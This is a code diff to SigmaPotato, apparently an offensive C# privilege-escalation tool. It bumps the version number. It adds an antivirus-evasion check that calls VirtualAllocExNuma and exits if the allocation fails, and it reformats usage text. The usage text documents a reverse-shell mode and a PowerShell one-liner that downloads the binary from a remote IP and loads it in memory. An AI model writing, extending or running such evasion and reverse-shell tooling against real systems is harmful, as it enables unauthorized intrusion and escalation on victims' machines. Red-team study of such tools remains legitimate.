@@ -5,12 +5,28 @@ using System.Diagnostics;
 using System.Security.Principal;
 using SharpToken;
 using NativeAPI;
+using System.Runtime.InteropServices;
+
 
 public class SigmaPotato
 {
     public static void Main(string[] args)
     {
 
+        // Rudimentary AV Heuristics Bypass by calling an Uncommon API
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hprocess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreffered);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+        if (mem == null)
+        {
+            return;
+        }
+
+
+        // Establish variables and assembly name
         TextWriter ConsoleWriter = Console.Out;
         Assembly assembly = Assembly.GetExecutingAssembly();
         AssemblyName assemblyName = assembly.GetName();
@@ -37,25 +53,25 @@ public class SigmaPotato
 
         string helpBody = @"
 Author: Tyler McCann (@tylerdotrar)
-Arbitary Version Number: v1.2.5
+Arbitary Version Number: v1.2.6
 
 .--------------------------------.
 | Usage from Disk via the Binary |
 '--------------------------------'
         
-[+]  Command Execution :  ./SigmaPotato.exe <command>
-[+]  Reverse Shell     :  ./SigmaPotato.exe --revshell <ip_addr> <port>
+[+]  Command Execution : ./SigmaPotato.exe <command>
+[+]  Reverse Shell     : ./SigmaPotato.exe --revshell <ip_addr> <port>
                 
 
 .---------------------------------------.
 | Usage from Memory via .NET Reflection |
 '---------------------------------------'
 
-[+]  Load Locally        :  [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
-[+]  Load Remotely       :  [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData(""http(s)://<ip_addr>/SigmaPotato.exe""))
+[+]  Load Locally      : [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
+[+]  Load Remotely     : [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_addr>/SigmaPotato.exe'))
 ---                    
-[+]  Command Execution   :  [SigmaPotato]::Main(""<command>"")
-[+]  Reverse Shell       :  [SigmaPotato]::Main(@(""--revshell"",""<ip_addr>"",""<port>""))
+[+]  Command Execution : [SigmaPotato]::Main('<command>')
+[+]  Reverse Shell     : [SigmaPotato]::Main(@('--revshell','<ip_addr>','<port>'))
 ";
 
 
